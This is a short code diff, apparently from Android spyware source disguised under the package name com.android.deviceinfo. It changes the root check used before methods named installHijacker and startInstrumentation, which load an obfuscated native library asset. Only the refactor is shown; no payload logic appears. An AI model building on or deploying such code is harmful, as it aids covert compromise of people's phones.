@@ -11,6 +11,7 @@ import com.android.deviceinfo.Beep;
 import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.capabilities.PackageInfo;
 import com.android.deviceinfo.conf.Configuration;
 
 import com.android.deviceinfo.file.Directory;
@@ -60,7 +61,7 @@ public class Instrument {
 		InputStream stream = Utils.getAssetStream(M.e("i.bin")); // libt.so
 
 		try {
-			if (Root.isRootShellInstalled() == false) {
+			if (PackageInfo.checkRoot() == false) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(installHijacker): Nope, we are not root");
 				}
@@ -101,7 +102,7 @@ public class Instrument {
 	}
 
 	public boolean startInstrumentation() {
-		if (Root.isRootShellInstalled() == false) {
+		if (PackageInfo.checkRoot() == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
 			}
